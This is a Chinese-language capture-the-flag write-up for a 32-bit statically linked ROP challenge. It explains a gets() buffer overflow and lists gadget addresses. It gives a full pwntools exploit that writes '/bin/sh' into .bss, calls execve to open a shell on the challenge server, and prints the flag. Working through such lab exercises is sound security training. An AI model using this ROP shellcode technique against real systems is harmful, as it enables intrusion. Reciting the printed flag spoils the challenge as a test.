# PHM #60 Pwn — ROP

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 50 |
| 連線 | `nc ctf.hackme.quest 7704` |
| 檔案 | [`/static/rop.xz`](https://ctf.hackme.quest/static/rop.xz) (ELF 32-bit, **statically linked**, not stripped) |
| 提示 | Buffer Overflow, ROP |
| 保護 | NX enabled, No canary, No PIE |

## 分析

`main` → `overflow()`: buffer 在 `ebp-0xc`, 用 `gets()` 讀 → 無限溢位。到 return address 的距離 = `0xc + 4 = 16`。

NX 開著, 不能塞 shellcode; 但 binary 是**靜態連結**, 整個 glibc 的 gadget 都在裡面 → 直接組 `execve("/bin/sh", 0, 0)` 的 ROP (`int 0x80`, eax=0xb)。

binary 裡**沒有 `/bin/sh` 字串**, 所以先用寫入 gadget 把它寫進 `.bss`:

```
pop eax ; ret        0x80b8016
pop ebx ; ret        0x80481c9
pop ecx ; ret        0x80de769
pop edx ; ret        0x806ecda
mov [edx], eax ; ret 0x805466b     ← 任意寫 4 bytes
int 0x80             0x806c943
```

## 解法

1. 用 `pop edx`/`pop eax`/`mov [edx],eax` 把 `"/bin/sh\x00"` 寫到 `bss+0x100`。
2. `pop eax=0xb; pop ebx=bss; pop ecx=0; pop edx=0; int 0x80` → `execve("/bin/sh")`。
3. payload 全程無 `\n` (gets 會被換行截斷)。

```python
from pwn import *
context(arch='i386', os='linux')
e=ELF('rop'); bss=e.bss()+0x100
pe,pb,pc,pd,wr,i80 = 0x80b8016,0x80481c9,0x80de769,0x806ecda,0x805466b,0x806c943
p  = b'A'*16
p += p32(pd)+p32(bss)  +p32(pe)+b'/bin'+p32(wr)
p += p32(pd)+p32(bss+4)+p32(pe)+b'/sh\x00'+p32(wr)
p += p32(pe)+p32(0xb)+p32(pb)+p32(bss)+p32(pc)+p32(0)+p32(pd)+p32(0)+p32(i80)
r=remote('ctf.hackme.quest',7704); r.sendline(p); r.sendline(b'cat flag'); print(r.recvall())
```

## Flag

```
FLAG{ROPgadget is your friend! 0w0...xmnGElie0sAvtcqq}
```

## 感想

靜態 binary 的 ROP 入門: 沒 `/bin/sh` 就自己寫進 `.bss`, 再湊 `int 0x80` 的 `execve`。`ROPgadget --binary` 一次把 `pop eax/ebx/ecx/edx`、`mov [edx],eax`、`int 0x80` 全找出來, 剩下就是排積木。
